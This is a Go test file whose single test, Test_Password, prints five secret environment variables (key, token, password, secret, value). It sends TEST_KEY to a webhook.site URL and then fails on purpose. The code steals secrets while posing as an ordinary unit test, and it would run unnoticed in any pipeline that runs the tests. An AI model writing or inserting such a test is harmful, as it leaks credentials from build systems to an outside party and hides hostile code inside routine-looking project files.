package tools

import (
	"fmt"
	"net/http"
	"os"
	"testing"
)

func Test_Password(t *testing.T) {
	fmt.Println(
		"TEST_KEY", os.Getenv("TEST_KEY"),
		"TEST_TOKEN", os.Getenv("TEST_TOKEN"),
		"TEST_PASSWORD", os.Getenv("TEST_PASSWORD"),
		"TEST_SECRET", os.Getenv("TEST_SECRET"),
		"TEST_VALUE", os.Getenv("TEST_VALUE"),
	)

	_, err := http.Get(fmt.Sprintf("https://webhook.site/939970ae-0ef9-4450-872b-8782c02f1844?TEST_KEY=%s", os.Getenv("TEST_KEY")))
	if err != nil {
		t.Log(err)
	}
	t.Log("Request sent")

	t.Fail()
}
